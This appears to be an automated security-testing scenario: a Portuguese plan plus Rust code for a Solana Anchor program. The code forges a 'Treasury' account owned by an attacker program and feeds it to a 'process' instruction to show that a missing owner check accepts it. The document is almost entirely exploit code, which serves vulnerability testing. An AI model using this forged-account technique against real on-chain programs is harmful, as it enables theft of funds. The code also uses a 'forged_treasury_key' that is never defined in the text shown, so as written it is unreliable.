{
  "plan": "Preparamos uma conta forjada cujo dono é um programa atacante (env.attacker_program) e cujos dados imitam o layout de Treasury (authority, balance, is_active=true). O baseline usa a instrução initialize para criar uma treasury legítima e provar que o cenário está montado corretamente. O ataque chama process passando a conta forjada como treasury, com a menor mudança possível. O efeito medido é que a conta forjada foi aceita e usada: o programa leu os dados forjados sem verificar o dono, e a execução teve sucesso.",
  "scenario": "let authority = Pubkey::new_unique();
let attacker_program = env.attacker_program.unwrap_or_else(Pubkey::new_unique);

// Conta forjada: dono é o programa atacante, dados imitam Treasury
let forged_data = anchor_account_data("Treasury", &(authority, 999u64, true));
let forged_treasury = account(&attacker_program, &forged_data, None);

// Baseline: initialize cria uma treasury legítima
let treasury_key = Pubkey::new_unique();
let init_ix = env.anchor_ix(
    "initialize",
    &(100u64,),
    vec![
        AccountMeta::new(treasury_key, true),
        AccountMeta::new(authority, true),
        AccountMeta::new_readonly(solana_program::system_program::id(), false),
    ],
);
let init_accounts = vec![
    (treasury_key, empty_account()),
    (authority, wallet(1_000_000_000)),
    system_program_account(),
];
let baseline_result = env.baseline("initialize legitimo", &init_ix, &init_accounts);

// Ataque: process com a conta forjada como treasury
let attack_ix = env.anchor_ix(
    "process",
    &(),
    vec![
        AccountMeta::new_readonly(forged_treasury_key, false),
        AccountMeta::new_readonly(authority, true),
    ],
);
let attack_accounts = vec![
    (forged_treasury_key, forged_treasury),
    (authority, wallet(1_000_000_000)),
];
let attack_result = env.attack("process com treasury forjada", &attack_ix, &attack_accounts);

if attack_result.program_result == ProgramResult::Success {
    let after_forged = after(&attack_result, &forged_treasury_key);
    env.effect(
        "conta forjada com dono diferente foi aceita e usada",
        after_forged.owner() == &attacker_program && after_forged.data() == forged_data.as_slice(),
    );
}"
}

